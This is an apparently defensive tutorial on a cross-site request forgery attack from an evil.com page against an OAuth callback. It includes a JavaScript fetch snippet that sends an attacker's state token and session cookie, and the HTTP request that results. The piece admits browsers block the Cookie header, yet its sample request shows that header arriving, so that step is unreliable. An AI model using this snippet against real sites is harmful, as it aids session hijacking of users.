# CSRF Attack Example from evil.com

Here's how an attacker might attempt to exploit the OAuth flow from their evil.com domain:

1. The attacker's webpage on evil.com might contain JavaScript like this:

```html
<script>
  // The attacker's known CSRF token and session ID
  const attackerCsrfToken = 'known_csrf_token_here';
  const attackerSessionId = 'known_session_id_here';

  // Craft the malicious URL
  const targetUrl = `https://your-app.com/auth/authorized?state=${attackerCsrfToken}&code=some_code_here`;

  // Function to make the request
  function makeRequest() {
    fetch(targetUrl, {
      method: 'GET',
      credentials: 'include',  // This tells the browser to send cookies
      headers: {
        'Cookie': `session=${attackerSessionId}`  // Attempt to set the session cookie
      }
    }).then(response => {
      console.log('Request completed', response);
    }).catch(error => {
      console.error('Error:', error);
    });
  }
</script>

<button onclick="makeRequest()">Click me!</button>
```

2. When the victim clicks the button (or this could be triggered automatically), their browser sends a GET request to your-app.com that looks like this:

```
GET /auth/authorized?state=known_csrf_token_here&code=some_code_here HTTP/1.1
Host: your-app.com
Cookie: session=known_session_id_here
```

Important notes:
- The attacker is attempting to send both the CSRF token (as a query parameter) and the session ID (as a cookie).
- Modern browsers would typically block the `Cookie` header in the `fetch` request due to security policies.
- If the victim has no existing session with your-app.com, the browser might send the request without any cookies.

This attack relies on your server accepting the `state` parameter and potentially creating a new session based on it, which is why proper server-side validation is crucial.
